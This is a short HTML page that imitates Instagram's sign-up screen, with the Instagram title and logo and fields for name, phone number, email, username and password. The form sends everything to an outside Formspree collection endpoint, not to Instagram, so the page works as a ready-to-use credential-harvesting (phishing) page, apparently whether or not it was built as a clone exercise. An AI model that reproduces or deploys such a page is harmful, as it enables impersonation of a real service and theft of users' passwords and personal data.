<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Instagram</title>
    <link rel="stylesheet" href="signup.css" />
  </head>
  <body>
    <div>
      <img src="images/logo.png" alt="Instagram logo" />
    </div>
    <form action="https://formspree.io/f/xyyowjez" method="post">
      <fieldset>
        <legend>Personal Details</legend>
        <div>
          <input
            type="text"
            name="name"
            placeholder="Name"
            required
            autocomplete="off"
          />
        </div>
        <div>
          <input
            type="number"
            name="number"
            placeholder="Number"
            required
            autocomplete="off"
          />
        </div>
        <div>
          <input
            type="email"
            name="email"
            placeholder="Email"
            required
            autocomplete="off"
          />
        </div>
        <div>
          <input
            type="text"
            name="name"
            placeholder="Username"
            required
            autocomplete="off"
          />
        </div>
        <div>
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            autocomplete="off"
          />
        </div>
        <button type="submit"><b>Sign Up</b></button>
      </fieldset>
    </form>
  </body>
</html>
